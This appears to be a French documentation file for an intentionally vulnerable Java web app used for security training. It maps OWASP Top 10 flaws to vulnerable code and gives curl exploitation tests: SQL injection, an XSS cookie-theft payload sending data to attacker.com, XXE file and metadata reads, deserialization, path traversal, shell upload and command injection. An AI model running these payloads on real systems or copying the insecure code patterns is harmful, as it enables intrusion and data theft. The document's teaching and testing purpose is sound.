# Synthèse des Vulnérabilités Implémentées

Ce document liste toutes les vulnérabilités intentionnellement implémentées dans cette application de test.

## Vue d'ensemble OWASP Top 10 (2021)

| # | Vulnérabilité | Statut | Fichiers Concernés | Endpoints |
|---|---------------|--------|-------------------|-----------|
| A01 | Broken Access Control | ✅ | UserController.java | `/user/profile/{id}`, `/user/admin/export` |
| A02 | Cryptographic Failures | ✅ | User.java, UserService.java, data.sql | `/user/admin/export` |
| A03 | Injection (SQL + XSS) | ✅ | UserService.java, UserController.java | `/user/search`, `/user/list`, `/user/comment` |
| A04 | Insecure Design (XXE) | ✅ | XmlController.java | `/xml/parse` |
| A05 | Security Misconfiguration | ✅ | web.xml, WebConfig.java, Dockerfile | Configuration globale |
| A06 | Vulnerable Components | ✅ | pom.xml | Dépendances Log4j, Spring, etc. |
| A07 | Authentication Failures | ✅ | AuthController.java, AuthService.java | `/auth/login`, `/auth/register`, `/auth/reset-password` |
| A08 | Data Integrity Failures | ✅ | DeserializeController.java | `/deserialize/object` |
| A09 | Logging Failures | ✅ | WebAppInitializer.java | Toute l'application |
| A10 | SSRF (Bonus) | ✅ | FileController.java | `/file/*` |

## Détail des Vulnérabilités

### 1. A01:2021 - Broken Access Control

#### Description
Contrôles d'accès défaillants permettant aux utilisateurs d'accéder à des ressources non autorisées.

#### Implémentation
- **Fichier**: [UserController.java](src/main/java/com/vulnerable/app/controller/UserController.java)
- **Lignes**: 51-72

#### Vulnérabilités spécifiques:
1. **IDOR (Insecure Direct Object Reference)**
   - Endpoint: `GET /user/profile/{userId}`
   - Problème: Aucune vérification que l'utilisateur connecté peut voir ce profil
   - Impact: N'importe qui peut voir n'importe quel profil

2. **Accès admin non protégé**
   - Endpoint: `GET /user/admin/export`
   - Problème: Pas de vérification du rôle admin
   - Impact: N'importe qui peut exporter toutes les données

#### Test d'exploitation:
```bash
# Voir le profil de l'admin (ID 1) sans être connecté
curl http://localhost:8080/vulnerable-app/user/profile/1

# Exporter toutes les données sensibles
curl http://localhost:8080/vulnerable-app/user/admin/export
```

---

### 2. A02:2021 - Cryptographic Failures

#### Description
Données sensibles stockées ou transmises sans chiffrement approprié.

#### Implémentation
- **Fichiers**:
  - [User.java](src/main/java/com/vulnerable/app/model/User.java)
  - [UserService.java](src/main/java/com/vulnerable/app/service/UserService.java)
  - [data.sql](src/main/resources/data.sql)

#### Vulnérabilités spécifiques:
1. **Mots de passe en clair**
   - Stockage: Base de données H2 sans hashing
   - Impact: Accès direct aux mots de passe en cas de breach

2. **Données PII non chiffrées**
   - SSN (Social Security Numbers)
   - Numéros de carte de crédit
   - Impact: Vol d'identité, fraude financière

3. **Export de données sensibles**
   - Endpoint: `GET /user/admin/export`
   - Format: CSV en clair
   - Impact: Exposition massive de données

#### Test d'exploitation:
```bash
# Exporter toutes les données sensibles en clair
curl http://localhost:8080/vulnerable-app/user/admin/export
```

---

### 3. A03:2021 - Injection

#### 3.1 SQL Injection

##### Description
Injection de code SQL malveillant via paramètres non validés.

##### Implémentation
- **Fichier**: [UserService.java](src/main/java/com/vulnerable/app/service/UserService.java)
- **Lignes**: 29-44, 50-66

##### Vulnérabilités:
1. **SQL Injection basique**
   ```java
   String query = "SELECT * FROM users WHERE username LIKE '%" + username + "%'";
   ```
   - Endpoint: `GET /user/search?username=`
   - Impact: Extraction de données, bypass d'authentification

2. **ORDER BY Injection**
   ```java
   String query = "SELECT * FROM users ORDER BY " + sortBy;
   ```
   - Endpoint: `GET /user/list?sortBy=`
   - Impact: Exécution de sous-requêtes, extraction de données

##### Tests d'exploitation:
```bash
# Bypass - Extraire tous les utilisateurs
curl "http://localhost:8080/vulnerable-app/user/search?username=' OR '1'='1"

# Union-based - Extraire des données spécifiques
curl "http://localhost:8080/vulnerable-app/user/search?username=' UNION SELECT id,username,password,email,role,ssn,credit_card FROM users--"

# ORDER BY Injection
curl "http://localhost:8080/vulnerable-app/user/list?sortBy=(CASE WHEN (SELECT COUNT(*) FROM users WHERE username='admin' AND password LIKE 'a%') > 0 THEN id ELSE username END)"
```

#### 3.2 Cross-Site Scripting (XSS)

##### Description
Injection de scripts malveillants dans les pages web.

##### Implémentation
- **Fichier**: [UserController.java](src/main/java/com/vulnerable/app/controller/UserController.java)
- **Lignes**: 78-83

##### Vulnérabilité:
```java
return "<p>Commentaire: " + comment + "</p>";  // Pas d'échappement!
```

##### Tests d'exploitation:
```bash
# XSS basique
curl "http://localhost:8080/vulnerable-app/user/comment?username=test&comment=<script>alert('XSS')</script>"

# Vol de cookies
curl "http://localhost:8080/vulnerable-app/user/comment?username=attacker&comment=<img src=x onerror='fetch(\"http://attacker.com/steal?c=\"+document.cookie)'>"
```

---

### 4. A04:2021 - Insecure Design (XXE)

#### Description
Parser XML non sécurisé permettant l'exploitation d'entités externes.

#### Implémentation
- **Fichier**: [XmlController.java](src/main/java/com/vulnerable/app/controller/XmlController.java)
- **Lignes**: 26-40

#### Vulnérabilité:
```java
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
// Pas de désactivation des entités externes!
```

#### Tests d'exploitation:
```bash
# Lecture de fichiers système
curl -X POST http://localhost:8080/vulnerable-app/xml/parse \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'

# SSRF vers metadata AWS
curl -X POST http://localhost:8080/vulnerable-app/xml/parse \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>'
```

---

### 5. A05:2021 - Security Misconfiguration

#### Description
Configurations de sécurité inadéquates ou par défaut.

#### Implémentation
Multiples fichiers:
- [web.xml](src/main/webapp/WEB-INF/web.xml)
- [WebConfig.java](src/main/java/com/vulnerable/app/config/WebConfig.java)
- [Dockerfile](Dockerfile)

#### Vulnérabilités:
1. **Cookies non sécurisés** (web.xml:24-27)
   ```xml
   <http-only>false</http-only>
   <secure>false</secure>
   ```

2. **Timeout de session excessif** (web.xml:22)
   ```xml
   <session-timeout>480</session-timeout> <!-- 8 heures! -->
   ```

3. **Upload sans limite** (WebConfig.java:33-36)
   ```java
   resolver.setMaxUploadSize(-1);  // Pas de limite!
   ```

4. **Conteneur en root** (Dockerfile)
   - Pas de USER non-privilégié

5. **Headers de sécurité manquants**
   - Pas de Content-Security-Policy
   - Pas de X-Frame-Options
   - Pas de Strict-Transport-Security

---

### 6. A06:2021 - Vulnerable and Outdated Components

#### Description
Utilisation de bibliothèques avec des CVEs connues.

#### Implémentation
- **Fichier**: [pom.xml](pom.xml)

#### Composants vulnérables:

| Composant | Version | CVE | Impact |
|-----------|---------|-----|--------|
| Log4j | 2.14.1 | CVE-2021-44228 (Log4Shell) | RCE critique |
| Spring Framework | 5.2.0 | Multiples CVEs | RCE, DoS |
| Jackson | 2.9.8 | CVE-2019-12384 | Désérialisation |
| Commons FileUpload | 1.3.1 | CVE-2016-1000031 | DoS |
| H2 Database | 1.4.200 | CVE-2021-42392 | RCE |

#### Vérification:
```bash
# Scanner avec OWASP Dependency-Check
mvn org.owasp:dependency-check-maven:check

# Scanner avec Snyk
snyk test
```

---

### 7. A07:2021 - Identification and Authentication Failures

#### Description
Mécanismes d'authentification et de session défaillants.

#### Implémentation
- **Fichiers**:
  - [AuthController.java](src/main/java/com/vulnerable/app/controller/AuthController.java)
  - [AuthService.java](src/main/java/com/vulnerable/app/service/AuthService.java)

#### Vulnérabilités:

1. **Mots de passe en clair** (AuthController.java:54-55)
   ```java
   if (!user.getPassword().equals(password)) // Comparaison directe!
   ```

2. **Messages d'erreur informatifs** (AuthController.java:49-51)
   ```java
   return "Erreur: L'utilisateur '" + username + "' n'existe pas";
   ```

3. **JWT avec clé faible** (AuthController.java:23)
   ```java
   private static final String SECRET_KEY = "secret";  // Hard-codé!
   ```

4. **Pas de limite de tentatives**
   - Permet le brute-force

5. **Réinitialisation sans vérification** (AuthController.java:110-125)
   - Pas de token
   - Pas d'email de confirmation

6. **Session fixation** (AuthController.java:69-70)
   - Pas de régénération d'ID de session

#### Tests d'exploitation:
```bash
# Énumération d'utilisateurs
curl -X POST "http://localhost:8080/vulnerable-app/auth/login?username=admin&password=wrong"
curl -X POST "http://localhost:8080/vulnerable-app/auth/login?username=nonexistent&password=wrong"

# Réinitialisation sans vérification
curl -X POST "http://localhost:8080/vulnerable-app/auth/reset-password?username=admin&newPassword=hacked"

# Brute-force (pas de rate limiting)
for pwd in $(cat passwords.txt); do
  curl -X POST "http://localhost:8080/vulnerable-app/auth/login?username=admin&password=$pwd"
done
```

---

### 8. A08:2021 - Software and Data Integrity Failures

#### Description
Désérialisation non sécurisée d'objets Java.

#### Implémentation
- **Fichier**: [DeserializeController.java](src/main/java/com/vulnerable/app/controller/DeserializeController.java)
- **Lignes**: 26-43

#### Vulnérabilité:
```java
ObjectInputStream ois = new ObjectInputStream(bis);
Object obj = ois.readObject();  // Dangereux!
```

#### Impact:
- Remote Code Execution (RCE)
- Exécution de commandes système
- Compromission complète du serveur

#### Tests d'exploitation:
```bash
# Utiliser ysoserial pour générer un payload
java -jar ysoserial.jar CommonsCollections6 "calc.exe" | base64

# Envoyer le payload
curl -X POST "http://localhost:8080/vulnerable-app/deserialize/object?data=PAYLOAD_BASE64"
```

---

### 9. A09:2021 - Security Logging and Monitoring Failures

#### Description
Logging et monitoring insuffisants des événements de sécurité.

#### Implémentation
- Toute l'application manque de logging approprié

#### Problèmes:
1. **Pas de logging des tentatives de connexion**
2. **Pas d'alerte sur activités suspectes**
   - Multiples tentatives de connexion
   - Injection SQL
   - Path Traversal
3. **Logs insuffisants** (schema.sql:20-25)
   - Pas d'IP source
   - Pas de User-Agent
   - Pas de géolocalisation
4. **Pas de SIEM intégration**
5. **Pas de monitoring en temps réel**

---

### 10. Vulnérabilités Additionnelles (Bonus)

#### 10.1 Path Traversal / Directory Traversal

**Fichier**: [FileController.java](src/main/java/com/vulnerable/app/controller/FileController.java)
**Lignes**: 28-47

```java
File file = new File(UPLOAD_DIR + filename);  // Pas de validation!
```

**Tests**:
```bash
curl "http://localhost:8080/vulnerable-app/file/download?filename=../../../../etc/passwd"
curl "http://localhost:8080/vulnerable-app/file/read?path=/etc/shadow"
```

#### 10.2 Unrestricted File Upload

**Lignes**: 56-76

**Problèmes**:
- Pas de validation du type MIME
- Pas de liste blanche d'extensions
- Pas de scan antivirus
- Pas de limite de taille

**Tests**:
```bash
# Upload d'un fichier JSP malveillant
curl -X POST -F "file=@shell.jsp" http://localhost:8080/vulnerable-app/file/upload
```

#### 10.3 Command Injection

**Lignes**: 94-113

```java
String command = "convert " + UPLOAD_DIR + filename + "...";
Runtime.getRuntime().exec(command);  // Injection!
```

**Tests**:
```bash
curl "http://localhost:8080/vulnerable-app/file/convert?filename=test.jpg; whoami"
curl "http://localhost:8080/vulnerable-app/file/convert?filename=test.jpg; cat /etc/passwd"
```

---

## Matrice de Risque

| Vulnérabilité | Sévérité | Exploitabilité | Impact |
|---------------|----------|----------------|---------|
| SQL Injection | CRITIQUE | Facile | Perte totale de données |
| XXE | CRITIQUE | Moyenne | Lecture de fichiers, SSRF |
| Insecure Deserialization | CRITIQUE | Difficile | RCE |
| Command Injection | CRITIQUE | Facile | RCE |
| Broken Access Control | HAUTE | Facile | Accès non autorisé |
| Broken Authentication | HAUTE | Moyenne | Compromission de comptes |
| XSS | MOYENNE | Facile | Vol de session |
| Path Traversal | HAUTE | Facile | Lecture de fichiers |
| Unrestricted Upload | HAUTE | Moyenne | Upload de malware |
| Vulnerable Components | CRITIQUE | Variable | RCE (Log4Shell) |
| Crypto Failures | HAUTE | Facile | Vol de données |
| Security Misconfiguration | MOYENNE | Facile | Exposition d'infos |
| Logging Failures | BASSE | N/A | Pas de détection |

---

## Checklist de Test

### Tests Manuels
- [ ] SQL Injection - Extraction de données
- [ ] SQL Injection - Bypass d'authentification
- [ ] XSS - Reflected
- [ ] XSS - Cookie stealing
- [ ] XXE - File disclosure
- [ ] XXE - SSRF
- [ ] IDOR - Accès aux profils
- [ ] Path Traversal - /etc/passwd
- [ ] Command Injection - whoami
- [ ] File Upload - JSP/PHP
- [ ] Broken Auth - Password reset
- [ ] Broken Auth - Énumération

### Tests Automatisés
- [ ] SQLMap - Scan complet
- [ ] OWASP ZAP - Spider + Active Scan
- [ ] Nikto - Scan serveur
- [ ] Nmap - Scan vulnérabilités
- [ ] Burp Suite - Scan complet

### Tests SAST
- [ ] SonarQube
- [ ] SpotBugs
- [ ] Semgrep
- [ ] Checkmarx

### Tests SCA
- [ ] OWASP Dependency-Check
- [ ] Snyk
- [ ] WhiteSource
- [ ] Black Duck

---

## Références

- [OWASP Top 10 2021](https://owasp.org/Top10/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [CWE Top 25](https://cwe.mitre.org/top25/)
- [SANS Top 25](https://www.sans.org/top25-software-errors/)

---

**Dernière mise à jour**: 2025-11-11
**Version**: 1.0.0
